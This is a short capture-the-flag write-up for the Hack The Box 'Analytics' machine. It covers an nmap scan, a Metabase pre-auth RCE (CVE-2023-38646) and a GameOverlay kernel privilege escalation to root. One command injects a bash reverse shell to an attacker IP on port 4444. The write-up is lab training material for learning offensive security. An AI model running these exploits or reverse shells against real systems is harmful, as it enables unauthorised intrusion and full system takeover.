---
title: "Analytics"
description: "HackTheBox Analytics Machine Writeup"
publishDate: "2024-01-01"
---

## Description
**Machine:** Analytics
**Platform:** Hack TheBox
**Difficulty:** Easy

## Enumeration

We start with an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -oA nmap/analytics 10.10.11.233
```

### Open Ports
- **22/tcp**: SSH
- **80/tcp**: HTTP

## Exploitation

### Metabase Pre-Auth RCE
Found a Metabase instance running on port 80. A search for vulnerabilities revealed a Pre-Auth RCE (CVE-2023-38646).

Using the setup token found in the HTML source, we can execute commands.

```bash
python3 exploit.py -u http://10.10.11.233 -t <token> -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"
```

## Privilege Escalation

### User to Root
After gaining a shell as the `metabase` user, we enumerate the system. We find that the kernel version is vulnerable to **GameOverlay** (CVE-2023-2640 and CVE-2023-32629).

Running the exploit gives us a root shell.

```bash
./gameoverlay_exploit
# whoami
root
```
